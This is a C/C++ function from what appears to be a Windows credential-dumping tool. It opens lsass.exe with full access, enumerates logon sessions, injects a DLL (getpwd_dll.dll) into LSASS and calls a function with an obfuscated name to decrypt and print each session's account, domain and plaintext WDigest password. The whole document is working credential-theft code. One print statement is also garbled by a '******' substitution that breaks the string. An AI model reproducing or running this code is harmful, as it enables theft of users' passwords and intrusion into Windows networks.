int LookupAccountPwd() {

	int nRet = -1;

	if (m_bNoisy) {
		msg_print("Reading by injecting code! (less-safe mode)\n");
	}

	DWORD dwLSASRV_dll = FindLSASRV_dll(), dwWDIGEST_dll = 0;

	OSVERSIONINFOA sysVersion;
	sysVersion.dwOSVersionInfoSize = sizeof(sysVersion);
	GetVersionExA(&sysVersion);

	if ((sysVersion.dwMajorVersion < 6) && (
		(sysVersion.dwMajorVersion != 5) || (sysVersion.dwMinorVersion != 2))) {
			dwWDIGEST_dll = FindWDIGEST_dll();
	}
	else {
		dwWDIGEST_dll = FindWDIGEST_dll_2();
	}

	if (!dwLSASRV_dll || !dwWDIGEST_dll) {
		msg_print("ERROR: Cannot find dependencies\n");
		return nRet;
	}

	DWORD dwProcessId = GetProcessIdByName(L"lsass.exe");
	if (!dwProcessId) {
		msg_print("Cannot get PID of LSASS.EXE!\n");
		exit(0);
	}

	HANDLE hLSASS = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcessId);
	if (hLSASS == INVALID_HANDLE_VALUE) {
		msg_print("Error: Cannot open LSASS.EXE!.\n");
		exit(0);
	}

	ULONG nLogonSessionCount = 0;
	PLUID pLogonSessionList = NULL; 
	NTSTATUS status = LsaEnumerateLogonSessions(&nLogonSessionCount, &pLogonSessionList);
	if (!NT_SUCCESS(status)) {
		msg_print("Can't enumerate logon sessions!\n");
		exit(0);
	}

	if (m_bNoisy) {
		msg_print("Logon Sessions Found: %d\n", nLogonSessionCount);
	}

	REMOTE_PARAM_T *remp = (REMOTE_PARAM_T *)malloc(sizeof(REMOTE_PARAM_T));
	if (!remp) {
		msg_print("Cannot alloc wcewdparams!.");
		exit(0);
	}

	INPUT_PARAM_T inpt;
	strcpy(inpt.FuncName, "_0212DBDHJKSAHD0183923kljmLKL");
	inpt.pParam = remp;
	inpt.paramSize = sizeof(REMOTE_PARAM_T);

	char szInjectDll[1024] = {0};	
	::GetCurrentDirectoryA(1022, szInjectDll);
	::PathAppendA(szInjectDll, "getpwd_dll.dll");

	for (ULONG i = 0; i < nLogonSessionCount; ++i) {

		memset(remp, 0, sizeof(REMOTE_PARAM_T));

		remp->dwDecryptAddr = dwLSASRV_dll;
		remp->dwLogonSessionEntry = dwWDIGEST_dll;

		remp->Retn = 0;
		remp->LogonId.LowPart = pLogonSessionList[i].LowPart;
		remp->LogonId.HighPart = pLogonSessionList[i].HighPart;

		if (GetUserPassword(dwProcessId, szInjectDll, &inpt)) {

			if (remp->Retn == 1) {

				msg_print("ID: %d\nAccout: %s\nDomain: %s\nPassword: "******"%s\n", remp->szPassword);
				}
				else {
					msg_print("<contains-non-printable-chars>");
				}			
			}
		}
		else {
			msg_print("Error in InjectDllAndCallFunction\n");
		}
	}

	free(remp);

	LsaFreeReturnBuffer(pLogonSessionList);
	return 0;
}